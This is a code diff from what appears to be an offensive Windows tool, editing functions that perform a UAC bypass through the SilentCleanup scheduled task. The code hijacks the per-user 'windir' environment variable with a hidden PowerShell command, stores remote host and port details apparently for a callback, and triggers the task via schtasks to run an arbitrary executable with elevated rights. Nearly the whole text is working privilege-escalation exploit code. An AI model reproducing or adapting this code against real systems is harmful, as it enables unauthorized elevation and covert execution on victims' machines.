@@ -54,13 +54,15 @@ BOOL ExploitSilentCleanup(char* PathExeToRun, WCHAR* ipAddress, char* port) {
     if (command == NULL)
         return FALSE;
 
-    sprintf_s(command, 1024, "powershell -windowstyle hidden %s;", PathExeToRun);
-    //sprintf_s(command, 1024, "powershell -windowstyle hidden %s;exit;", PathExeToRun);
+    //sprintf_s(command, 1024, "powershell -windowstyle hidden %s;", PathExeToRun);
+    sprintf_s(command, 1024, "powershell -windowstyle hidden %s;exit;", PathExeToRun);
 
 
     DisableWindowsRedirection(&pOldVal);
     if (SetRegistryValue(HKEY_CURRENT_USER, (char*)"Environment", "windir", command)) {
         if (SaveRHostInfo(ipAddress, port)) {
+
+            // schtasks.exe error ???
             returnValue = Run("schtasks.exe", "/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I");
         } else
             printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to save RHOST/RPORT information");
@@ -101,7 +103,7 @@ BOOL RunUacBypass(char* PathExeToRun, WCHAR* ipAddress, char* port, UAC_BYPASS_T
     } else {
         UAC_POLICY uacPolicy = CheckUACSettings();
         if (uacPolicy == UAC_POLICY_DEFAULT || uacPolicy == UAC_POLICY_DISABLE) { // OK ???   
-            UINT nbChoice = sizeof(uac_bypass_data) / sizeof(UAC_BYPASS_DATA) + 1;
+            //UINT nbChoice = sizeof(uac_bypass_data) / sizeof(UAC_BYPASS_DATA) + 1;
 
             if (UacBypassTec == UAC_BYPASS_COMP_SILENT_CLEAN) {
                 printMsg(STATUS_INFO, LEVEL_DEFAULT, "UAC bypass technique: 'Silent Cleanup'\n");
